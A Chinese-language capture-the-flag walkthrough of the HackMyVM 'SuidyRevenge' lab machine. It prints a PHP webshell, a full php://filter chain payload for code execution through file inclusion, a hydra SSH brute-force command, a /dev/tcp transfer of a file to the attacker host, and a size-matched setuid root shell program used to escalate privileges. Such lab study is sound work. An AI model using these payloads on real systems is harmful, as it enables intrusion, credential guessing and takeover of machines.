---
title: SuidyRevenge
author: hgbe02
date: 2024-04-18
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/SuidyRevenge.html"
---

# SuidyRevenge

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404181846304.png" alt="image-20240418162222333" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404181846305.png" alt="image-20240418163526214" style="zoom: 50%;" />

## 信息搜集

### 端口扫描

```bash
rustscan -a 192.168.0.140 -- -A

Open 192.168.0.140:22
Open 192.168.0.140:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 99:04:21:6d:81:68:2e:d7:fe:5e:b2:2c:1c:a2:f5:3d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAG/AX+0fiqIOG/5Jb4HuzPcAIdWkKC9AY7R9eqeSvykjKD3T3cVL5rbWGz3vfkBBDqVAp6l6Fj3CGsS6h4jKrnObsoDxtfIMAgspLQF9b9KjMEcM0aLDQKusQI5H9C5/HMsC50qx7XZUeOoTDinNR4wFjBls2PcbY8IJoRtapRYxvkRHc4l+eSpZk8+NJ2Z0xGYljlCwketld9+9BZuKEBThRvms+5ZQ8AQntoG7mD2JgeIIHr5vxU62ECM5V1EWhAnW8KEI3otZKAOpU48p3r+pWpAeGJJapWAx8f+IPzDWpR7BwosImvRvUgXgqqvPwkqCL9t8HJrieWcIrm1a1
|   256 b2:4e:c2:91:2a:ba:eb:9c:b7:26:69:08:a2:de:f2:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGWoTM7aAsBYvrYZYL4vz9sEaD+Pf0pYs61DwxR0zyK8de0rg+OoAnDz217AhoO78rRAqAdrE6382xpHKcmrm8I=
|   256 66:4e:78:52:b1:2d:b6:9a:8b:56:2b:ca:e5:48:55:2d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII4uRBZ1dmmy2uld4YwTO9LQeMWjp7nsQLNZXsg+nBfl
80/tcp open  http    syn-ack nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 目录扫描

```bash
┌──(kali💀kali)-[~/temp/SuidyRevenge]
└─$ gobuster dir -u http://192.168.0.140 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,zip,bak,git,jpg,txt,png
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.140
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,png,php,zip,bak,git,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 581664 / 1764488 (32.97%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 586627 / 1764488 (33.25%)
===============================================================
Finished
===============================================================
```

## 漏洞发现

### 踩点

```bash
Im proud to announce that "theuser" is not anymore in our servers. Our admin "mudra" is the best admin of the world. -suidy
<!--

"mudra" is not the best admin, IM IN!!!!
He only changed my password to a different but I had time
to put 2 backdoors (.php) from my KALI into /supersecure to keep the access!

-theuser

-->
```

### 信息搜集

找一下kali自带的webshell：

```bash
┌──(kali💀kali)-[~/temp/SuidyRevenge]
└─$ ls /usr/share/webshells/php
findsocket  php-backdoor.php  php-reverse-shell.php  qsd-php-backdoor.php  simple-backdoor.php
```

尝试一下是否阔以利用，最后一个阔以：

```bash
http://192.168.0.140/supersecure/simple-backdoor.php?cmd=whoami
```

```apl
cmd parameter is my friend.
www-data
```

尝试反弹shell，但是失败了，查看一下:

```php
┌──(kali💀kali)-[~/temp/SuidyRevenge]
└─$ cat /usr/share/webshells/php/simple-backdoor.php       
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<!--    http://michaeldaw.org   2006    -->
```

看一下其他信息：

```apl
http://192.168.0.140/supersecure/simple-backdoor.php?cmd=pwd
```

```text
/var/www/html/supersecure
```

然后看一下当前目录存在哪些文件：

```apl
http://192.168.0.140/supersecure/simple-backdoor.php?cmd=ls
```

```text
mysuperbackdoor.php
simple-backdoor.php
```

`simple-backdoor.php`发现好像只可以使用字母和空格，其他的不管加啥都不行，尝试利用第一个：

```bash
http://192.168.0.140/supersecure/mysuperbackdoor.php?file=php://filter/read=convert.base64-encode/resource=mysuperbackdoor.php
```

```php
ZmlsZSBwYXJhbWV0ZXIgaXMgbXkgZnJpZW5kLgo8P3BocAppbmNsdWRlICRfUkVRVUVTVFsnZmlsZSddOwo/Pgo=
file parameter is my friend.
<?php
include $_REQUEST['file'];
?>
```

```bash
http://192.168.0.140/supersecure/mysuperbackdoor.php?file=php://filter/read=convert.base64-encode/resource=simple-backdoor.php
```

```php
Y21kIHBhcmFtZXRlciBpcyBteSBmcmllbmQuCjw/cGhwCgppZihpc3NldCgkX1JFUVVFU1RbJ2NtZCddKSl7CiAgICAgICAgZWNobyAiPHByZT4iOwogICAgICAgICRjbWQgPSAoJF9SRVFVRVNUWydjbWQnXSk7CiAgICAgICAgJHJlc3VsdCA9IHByZWdfcmVwbGFjZSgiL1teYS16QS1aMC05XSsvIiwgIiIsICRjbWQpOwogICAgICAgIHN5c3RlbSgkcmVzdWx0KTsKICAgICAgICBlY2hvICI8L3ByZT4iOwogICAgICAgIGRpZTsKfQoKPz4K
cmd parameter is my friend.
<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        $result = preg_replace("/[^a-zA-Z0-9]+/", "", $cmd);
        system($result);
        echo "</pre>";
        die;
}

?>
```

尝试进行无文件的木马执行：

```bash
┌──(kali💀kali)-[~/php_filter_chain_generator]
└─$ python3 php_filter_chain_generator.py --chain '<?=`$_GET[0]` ?>'
[+] The following gadget chain will generate the following code : <?=`$_GET[0]` ?> (base64 value: PD89YCRfR0VUWzBdYCA/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

尝试利用：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404181846307.png" alt="image-20240418172136190" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404181846308.png" alt="image-20240418172146120" style="zoom:50%;" />

## 提权

### 信息搜集

```bash
(remote) www-data@suidyrevenge:/var/www/html/supersecure$ find / -perm -u=s -type f 2>/dev/null
/home/suidy/suidyyyyy
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/umount
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/mount
/usr/bin/violent
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/passwd
(remote) www-data@suidyrevenge:/var/www/html/supersecure$ file /home/suidy/suidyyyyy
/home/suidy/suidyyyyy: setuid, setgid regular file, no read permission
(remote) www-data@suidyrevenge:/var/www/html/supersecure$ ls -la
total 16
drwxr-xr-x 2 root     root 4096 Oct  1  2020 .
drwxr-xr-x 3 root     root 4096 Oct  1  2020 ..
-rw-r--r-- 1 www-data root   65 Oct  1  2020 mysuperbackdoor.php
-rw-r--r-- 1 www-data root  249 Oct  1  2020 simple-backdoor.php
(remote) www-data@suidyrevenge:/var/www/html/supersecure$ cd ..;ls -la
total 20
drwxr-xr-x 3 root     root     4096 Oct  1  2020 .
drwxr-xr-x 3 root     root     4096 Oct  1  2020 ..
-rw-r--r-- 1 root     root      322 Oct  1  2020 index.html
-rw-r--r-- 1 www-data www-data   79 Oct  1  2020 murdanote.txt
drwxr-xr-x 2 root     root     4096 Oct  1  2020 supersecure
(remote) www-data@suidyrevenge:/var/www/html$ cat murdanote.txt 
I always lost my password so Im using 
one password from rockyou.txt !

-murda
(remote) www-data@suidyrevenge:/var/www/html/supersecure$ cd /home/suidy/
(remote) www-data@suidyrevenge:/home/suidy$ ./suidyyyyy
bash: ./suidyyyyy: Permission denied
(remote) www-data@suidyrevenge:/home/suidy$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for www-data: 
(remote) www-data@suidyrevenge:/home/suidy$ ls -la
total 52
drwxrwxr-x 3 suidy suidy    4096 Oct  2  2020 .
drwxr-xr-x 8 root  root     4096 Oct  1  2020 ..
-rw------- 1 suidy suidy      25 Oct  1  2020 .bash_history
-rwxrwx--- 1 suidy suidy     220 Oct  1  2020 .bash_logout
-rwxrwx--- 1 suidy suidy    3526 Oct  1  2020 .bashrc
drwxr-xr-x 3 suidy suidy    4096 Oct  1  2020 .local
-rwxrwx--- 1 suidy suidy     807 Oct  1  2020 .profile
-rw-r----- 1 suidy suidy     262 Oct  1  2020 note.txt
-rwsrws--- 1 root  theuser 16712 Oct  2  2020 suidyyyyy
(remote) www-data@suidyrevenge:/home/suidy$ 
```

### 爆破一下辣

```bash
hydra -l murda -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.140 -t 64
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404181846309.png" alt="image-20240418172949704" style="zoom:50%;" />

### 尝试切换用户

```bash
murda@suidyrevenge:/var/www/html$ cd /home/murda/
murda@suidyrevenge:~$ ls -la
total 36
drwxrwxr-- 3 murda murda 4096 Oct  1  2020 .
drwxr-xr-x 8 root  root  4096 Oct  1  2020 ..
-rw------- 1 murda murda   25 Oct  1  2020 .bash_history
-rwxrwx--- 1 murda murda  220 Oct  1  2020 .bash_logout
-rwxrwx--- 1 murda murda 3526 Oct  1  2020 .bashrc
drwxr-xr-x 3 murda murda 4096 Oct  1  2020 .local
-rwxrwx--- 1 murda murda  807 Oct  1  2020 .profile
-rwxrwx--- 1 murda murda  178 Oct  1  2020 secret.txt
-rwxrwx--- 1 murda murda   58 Oct  1  2020 .Xauthority
murda@suidyrevenge:~$ cat secret.txt 
I know that theuser is here!
I just got the id_rsa from "violent".
I will put the key in a secure place for theuser!
I hope he find it.
Remember that rockyou.txt is your friend!
murda@suidyrevenge:~$ cat .bash_history 
rm ~/.bash_history 
exit
murda@suidyrevenge:~$ cd ..
murda@suidyrevenge:/home$ ls -la
total 32
drwxr-xr-x  8 root    root    4096 Oct  1  2020 .
drwxr-xr-x 18 root    root    4096 Oct  1  2020 ..
drwxrwxr--  3 murda   murda   4096 Oct  1  2020 murda
drwxrwx---  2 ruin    ruin    4096 Oct  1  2020 ruin
drwxrwxr-x  3 suidy   suidy   4096 Oct  2  2020 suidy
drwxrwx---  3 theuser theuser 4096 Oct  2  2020 theuser
drwxrwx---  3 violent violent 4096 Oct  1  2020 violent
drwxrwx---  2 yo      yo      4096 Oct  1  2020 yo
murda@suidyrevenge:/home$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
murda:x:1000:1000:murda,,,:/home/murda:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
violent:x:1001:1001:,,,:/home/violent:/bin/bash
yo:x:1002:1002:,,,:/home/yo:/bin/bash
ruin:x:1003:1003:,,,:/home/ruin:/bin/bash
theuser:x:1004:1004:,,,:/home/theuser:/bin/bash
suidy:x:1005:1005:,,,:/home/suidy:/bin/bash
```

### 获取theuser

我滴妈，好多的用户。。。。

尝试爆破一下`theuser`，一直未果，尝试web上的那些个单词，发现密码为`different`：

```bash
murda@suidyrevenge:/home$ su theuser
Password: 
theuser@suidyrevenge:/home$ cd theuser/
theuser@suidyrevenge:~$ ls -la
total 32
drwxrwx--- 3 theuser theuser 4096 Oct  2  2020 .
drwxr-xr-x 8 root    root    4096 Oct  1  2020 ..
-rw------- 1 theuser theuser   33 Oct  2  2020 .bash_history
-rwxrwx--- 1 theuser theuser  220 Oct  1  2020 .bash_logout
-rwxrwx--- 1 theuser theuser 3526 Oct  1  2020 .bashrc
drwxr-xr-x 3 theuser theuser 4096 Oct  1  2020 .local
-rwxrwx--- 1 theuser theuser  807 Oct  1  2020 .profile
-rw-r----- 1 theuser theuser 1961 Oct  2  2020 user.txt
theuser@suidyrevenge:~$ cat user.txt 
                                                                                
                                   .     **                                     
                                *           *.                                  
                                              ,*                                
                                                 *,                             
                         ,                         ,*                           
                      .,                              *,                        
                    /                                    *                      
                 ,*                                        *,                   
               /.                                            .*.                
             *                                                  **              
             ,*                                               ,*                
                **                                          *.                  
                   **                                    **.                    
                     ,*                                **                       
                        *,                          ,*                          
                           *                      **                            
                             *,                .*                               
                                *.           **                                 
                                  **      ,*,                                   
                                     ** *,                                      
                                                                                
                                                                                
                                                                                
HMVbisoususeryay
theuser@suidyrevenge:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for theuser: 
Sorry, user theuser may not run sudo on suidyrevenge.
theuser@suidyrevenge:~$ cat /etc/cron*
cat: /etc/cron.d: Is a directory
cat: /etc/cron.daily: Is a directory
cat: /etc/cron.hourly: Is a directory
cat: /etc/cron.monthly: Is a directory
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
cat: /etc/cron.weekly: Is a directory
theuser@suidyrevenge:~$ cd ../suidy/
theuser@suidyrevenge:/home/suidy$ ls -la
total 52
drwxrwxr-x 3 suidy suidy    4096 Oct  2  2020 .
drwxr-xr-x 8 root  root     4096 Oct  1  2020 ..
-rw------- 1 suidy suidy      25 Oct  1  2020 .bash_history
-rwxrwx--- 1 suidy suidy     220 Oct  1  2020 .bash_logout
-rwxrwx--- 1 suidy suidy    3526 Oct  1  2020 .bashrc
drwxr-xr-x 3 suidy suidy    4096 Oct  1  2020 .local
-rw-r----- 1 suidy suidy     262 Oct  1  2020 note.txt
-rwxrwx--- 1 suidy suidy     807 Oct  1  2020 .profile
-rwsrws--- 1 root  theuser 16712 Oct  2  2020 suidyyyyy
theuser@suidyrevenge:/home/suidy$ ./suidyyyyy 
suidy@suidyrevenge:/home/suidy$ whoami;id
suidy
uid=1005(suidy) gid=1004(theuser) groups=1004(theuser)
```

### 尝试获取root

```bash
suidy@suidyrevenge:/home/suidy$ ls -la
total 52
drwxrwxr-x 3 suidy suidy    4096 Oct  2  2020 .
drwxr-xr-x 8 root  root     4096 Oct  1  2020 ..
-rw------- 1 suidy suidy      25 Oct  1  2020 .bash_history
-rwxrwx--- 1 suidy suidy     220 Oct  1  2020 .bash_logout
-rwxrwx--- 1 suidy suidy    3526 Oct  1  2020 .bashrc
drwxr-xr-x 3 suidy suidy    4096 Oct  1  2020 .local
-rw-r----- 1 suidy suidy     262 Oct  1  2020 note.txt
-rwxrwx--- 1 suidy suidy     807 Oct  1  2020 .profile
-rwsrws--- 1 root  theuser 16712 Oct  2  2020 suidyyyyy
suidy@suidyrevenge:/home/suidy$ cat note.txt 
I know that theuser is not here anymore but suidyyyyy is now more secure!
root runs the script as in the past that always gives SUID to suidyyyyy binary
but this time also check the size of the file.
WE DONT WANT MORE "theuser" HERE!.
WE ARE SECURE NOW.

-suidy
suidy@suidyrevenge:/home/suidy$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for suidy:
```

传到本地尝试分析一下这个`suidyyyyy`

```bash
cat suidyyyyy > /dev/tcp/192.168.0.143/8888
nc -lp 8888 > suidyyyyy
```

用ida打开看一下：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setuid(0x3EDu);
  setgid(0x3EDu);
  system("/bin/bash");
  return 0;
}
```

额。。。。注意到文件权限，尝试进行替换，但是上面说检查尺寸了，所以要生成一个`16712`的可执行文件：

```c
#include<stdlib.h>
int main(void){
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

这个大小为`16056`，增加一点东西：

```c
# include<stdlib.h>
int main(void){
    setuid(0);
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

但是不管用，编译器会自动给他优化掉，本地的gcc和服务器上的gcc版本还不一样，编译出来大小还不一样，得用靶机来搞

```bash
suidy@suidyrevenge:/home/suidy$ ls
note.txt  suidyyyyy
suidy@suidyrevenge:/home/suidy$ vi suid.c
suidy@suidyrevenge:/home/suidy$ gcc suid.c -o suid
gcc: error trying to exec 'cc1': execvp: No such file or directory
suidy@suidyrevenge:/home/suidy$ gcc
gcc: fatal error: no input files
compilation terminated.
```

换用户照样报错。。。

```bash
theuser@suidyrevenge:~$ vi exp.c
theuser@suidyrevenge:~$ gcc exp.c -o exp
gcc: error trying to exec 'cc1': execvp: No such file or directory
```

解决一下：

```bash
theuser@suidyrevenge:~$ gcc exp.c -o exp
gcc: error trying to exec 'cc1': execvp: No such file or directory
theuser@suidyrevenge:~$ find /usr/ -name "*cc1*"
/usr/lib/gcc/x86_64-linux-gnu/8/libcc1.so
/usr/lib/gcc/x86_64-linux-gnu/8/plugin/libcc1plugin.so.0
/usr/lib/gcc/x86_64-linux-gnu/8/plugin/libcc1plugin.so
/usr/lib/gcc/x86_64-linux-gnu/8/plugin/libcc1plugin.so.0.0.0
/usr/lib/gcc/x86_64-linux-gnu/8/cc1
/usr/lib/x86_64-linux-gnu/libcc1.so.0
/usr/lib/x86_64-linux-gnu/libcc1.so.0.0.0
/usr/share/doc/libgcc1
/usr/share/doc/libisccc161
/usr/share/doc/libcc1-0
/usr/share/lintian/overrides/libgcc1
/usr/share/terminfo/x/xterm+pcc1
theuser@suidyrevenge:~$ export PATH=$PATH:/usr/lib/gcc/x86_64-linux-gnu/8/
theuser@suidyrevenge:~$ gcc exp.c -o exp
exp.c: In function ‘main’:
exp.c:4:5: warning: implicit declaration of function ‘setuid’; did you mean ‘setenv’? [-Wimplicit-function-declaration]
     setuid(0);
     ^~~~~~
     setenv
exp.c:5:5: warning: implicit declaration of function ‘setgid’; did you mean ‘setenv’? [-Wimplicit-function-declaration]
     setgid(0);
     ^~~~~~
     setenv
theuser@suidyrevenge:~$ ls -la
total 56
drwxrwx--- 3 theuser theuser  4096 Apr 18 06:33 .
drwxr-xr-x 8 root    root     4096 Oct  1  2020 ..
-rw------- 1 theuser theuser    33 Oct  2  2020 .bash_history
-rwxrwx--- 1 theuser theuser   220 Oct  1  2020 .bash_logout
-rwxrwx--- 1 theuser theuser  3526 Oct  1  2020 .bashrc
-rwxr-xr-x 1 theuser theuser 16712 Apr 18 06:33 exp
-rw-r--r-- 1 theuser theuser   103 Apr 18 06:31 exp.c
drwxr-xr-x 3 theuser theuser  4096 Oct  1  2020 .local
-rwxrwx--- 1 theuser theuser   807 Oct  1  2020 .profile
-rw-r----- 1 theuser theuser  1961 Oct  2  2020 user.txt
```

诺，大小一样了，尝试丢过去，执行：

```bash
theuser@suidyrevenge:~$ cd ../
theuser@suidyrevenge:/home$ cd suidy/
theuser@suidyrevenge:/home/suidy$ cp /home/theuser/exp suidyyyyy
theuser@suidyrevenge:/home/suidy$ ls -la
total 56
drwxrwxr-x 3 suidy suidy    4096 Apr 18 06:25 .
drwxr-xr-x 8 root  root     4096 Oct  1  2020 ..
-rw-r--r-- 1 suidy theuser    94 Apr 18 06:24 a.c
-rw------- 1 suidy suidy      25 Oct  1  2020 .bash_history
-rwxrwx--- 1 suidy suidy     220 Oct  1  2020 .bash_logout
-rwxrwx--- 1 suidy suidy    3526 Oct  1  2020 .bashrc
drwxr-xr-x 3 suidy suidy    4096 Oct  1  2020 .local
-rw-r----- 1 suidy suidy     262 Oct  1  2020 note.txt
-rwxrwx--- 1 suidy suidy     807 Oct  1  2020 .profile
-rwxrwx--- 1 root  theuser 16712 Apr 18 06:36 suidyyyyy
theuser@suidyrevenge:/home/suidy$ ./suidyyyyy
theuser@suidyrevenge:/home/suidy$ ./suidyyyyy 
theuser@suidyrevenge:/home/suidy$ ls -la
total 56
drwxrwxr-x 3 suidy suidy    4096 Apr 18 06:25 .
drwxr-xr-x 8 root  root     4096 Oct  1  2020 ..
-rw-r--r-- 1 suidy theuser    94 Apr 18 06:24 a.c
-rw------- 1 suidy suidy      25 Oct  1  2020 .bash_history
-rwxrwx--- 1 suidy suidy     220 Oct  1  2020 .bash_logout
-rwxrwx--- 1 suidy suidy    3526 Oct  1  2020 .bashrc
drwxr-xr-x 3 suidy suidy    4096 Oct  1  2020 .local
-rw-r----- 1 suidy suidy     262 Oct  1  2020 note.txt
-rwxrwx--- 1 suidy suidy     807 Oct  1  2020 .profile
-rwsrws--- 1 root  theuser 16712 Apr 18 06:36 suidyyyyy
theuser@suidyrevenge:/home/suidy$ ./suidyyyyy 
root@suidyrevenge:/home/suidy# cd /root
root@suidyrevenge:/root# ls -la
total 56
drwx------  3 root root  4096 Oct  2  2020 .
drwxr-xr-x 18 root root  4096 Oct  1  2020 ..
-rw-------  1 root root   127 Oct  2  2020 .bash_history
-rw-r--r--  1 root root   570 Jan 31  2010 .bashrc
drwxr-xr-x  3 root root  4096 Oct  1  2020 .local
-rw-r--r--  1 root root   148 Aug 17  2015 .profile
-rw-r-----  1 root root  1961 Oct  2  2020 root.txt
-rwxr-x--x  1 root root   517 Oct  1  2020 script.sh
-rw-r--r--  1 root root    66 Oct  1  2020 .selected_editor
-rwxr-xr-x  1 root root 16712 Oct  2  2020 suidyyyyy
root@suidyrevenge:/root# cat script.sh 
FILE=/home/suidy/suidyyyyy
if [ -f "$FILE" ]; then
echo ""
        else 
   cp /root/suidyyyyy /home/suidy
   chown root:theuser /home/suidy/suidyyyyy
   chmod 770 /home/suidy/suidyyyyy
   chmod +s /home/suidy/suidyyyyy

fi


if [ $(stat -c%s /root/suidyyyyy) -ne $(stat -c%s /home/suidy/suidyyyyy) ]; then 
   echo "They're different."
   cp /root/suidyyyyy /home/suidy
   chown root:theuser /home/suidy/suidyyyyy
   chmod 770 /home/suidy/suidyyyyy
   chmod +s /home/suidy/suidyyyyy
else
chmod +s /home/suidy/suidyyyyy
fi

root@suidyrevenge:/root# cat root.txt 
                                                                                
                                   .     **                                     
                                *           *.                                  
                                              ,*                                
                                                 *,                             
                         ,                         ,*                           
                      .,                              *,                        
                    /                                    *                      
                 ,*                                        *,                   
               /.                                            .*.                
             *                                                  **              
             ,*                                               ,*                
                **                                          *.                  
                   **                                    **.                    
                     ,*                                **                       
                        *,                          ,*                          
                           *                      **                            
                             *,                .*                               
                                *.           **                                 
                                  **      ,*,                                   
                                     ** *,                                      
                                                                                
                                                                                
HMVvoilarootlala
```

拿到flag！！！

## 额外收获

### 墨师傅LFI读取

在[墨师傅的wp](https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/HackMyVM/Machines/SuidyRevenge/)中使用file协议进行写入木马：

```bash
